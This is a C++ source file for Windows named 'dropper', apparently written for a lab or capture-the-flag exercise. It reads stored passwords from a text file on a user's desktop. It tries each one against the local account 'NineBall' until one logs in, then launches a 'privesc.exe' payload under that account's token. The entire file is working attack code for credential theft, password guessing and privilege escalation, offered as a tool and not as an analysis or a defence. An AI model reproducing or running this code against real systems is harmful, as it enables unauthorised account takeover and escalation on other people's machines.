#include "dropper.hpp"

int wmain() {

	// read passwords in doc
	std::wifstream file;
	file.open(L"C:\\Users\\NineBall\\Desktop\\notmypasswords.txt", std::ios::in);
	std::vector<std::wstring> passList;
	std::wstring pass;

	if (file.is_open()) {
		std::wstring s;
		while (std::getline(file, s)) {
			passList.push_back(s.substr(s.find(L":") + 2));
		}
	}
	file.close();

	// attempt to authenticate as NineBall with passwords
	HANDLE hToken = NULL;
	for (std::wstring s : passList) {
		std::wcout << L"\"" << s << L"\"" << std::endl;
		if (LogonUserW(
			L"NineBall",
			L".",
			s.c_str(),
			LOGON32_LOGON_NETWORK,
			LOGON32_PROVIDER_DEFAULT,
			&hToken
		)) {
			pass = s;
			break;
		}
	}

	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE) {
		std::wcout << L"failed to get NineBall token" << std::endl;
	}

	std::wcout << L"pass: \"" << pass << L"\"" << std::endl;

	// create privesc process as NineBall
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessAsUserW(
		hToken,
		L"privesc.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		std::wcout << L"couldn't create privesc process" << std::endl;
	}

	// unsure if these will cause dropper to stay up
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}

namespace dropper {

}